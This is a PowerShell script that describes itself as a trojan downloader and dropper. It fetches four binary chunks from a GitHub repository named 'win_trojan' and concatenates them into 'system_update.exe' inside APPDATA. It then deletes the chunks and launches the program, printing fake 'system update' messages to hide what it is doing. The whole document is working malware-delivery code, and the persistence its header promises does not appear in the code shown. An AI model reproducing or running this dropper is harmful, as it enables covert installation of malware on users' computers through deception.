<#
.SYNOPSIS
    Trojan Client Downloader & Dropper
.DESCRIPTION
    Downloads binary chunks from GitHub, reassembles them, configures persistence, and executes.
#>

$Repo = "Noah-school/win_trojan"
$BaseUrl = "https://raw.githubusercontent.com/$Repo/main" # Try main first
$TargetDir = "$env:APPDATA\SystemUpdates"
$TargetBin = "$TargetDir\system_update.exe"
$Parts = @("trojan_client_part_aa", "trojan_client_part_ab", "trojan_client_part_ac", "trojan_client_part_ad")

Write-Host "[*] Initializing System Update..." -ForegroundColor Cyan

# Create Directory
if (-not (Test-Path -Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir | Out-Null
}

Set-Location -Path $TargetDir

# Function to download file
function Download-File {
    param ($FileName)
    $Url = "$BaseUrl/$FileName"
    try {
        Invoke-WebRequest -Uri $Url -OutFile $FileName -ErrorAction Stop
        Write-Host " -> Downloaded $FileName" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[-] Failed to download $FileName from main. Trying master..." -ForegroundColor Yellow
        try {
            $Url = $Url.Replace("/main/", "/master/")
            Invoke-WebRequest -Uri $Url -OutFile $FileName -ErrorAction Stop
            Write-Host " -> Downloaded $FileName" -ForegroundColor Green
            return $true
        }
        catch {
            Write-Host "[-] Error downloading $FileName" -ForegroundColor Red
            return $false
        }
    }
}

# Download Parts
foreach ($Part in $Parts) {
    Download-File -FileName $Part
}

# Reassemble
Write-Host "[*] Installing update..."
try {
    # Using cmd /c copy /b is fastest and reliable for binary concat on Windows
    $PartString = $Parts -join "+"
    cmd /c "copy /b $PartString system_update.exe" | Out-Null
    
    if (Test-Path $TargetBin) {
        Write-Host "[+] Installation Complete." -ForegroundColor Green
        
        # Clean up parts
        Remove-Item trojan_client_part_* -ErrorAction SilentlyContinue

        # Run
        Write-Host "[*] Starting service..."
        Start-Process -FilePath $TargetBin
    }
    else {
        Write-Host "[-] Installation failed (Assembly error)." -ForegroundColor Red
    }
}
catch {
    Write-Host "[-] Error during installation: $_" -ForegroundColor Red
}
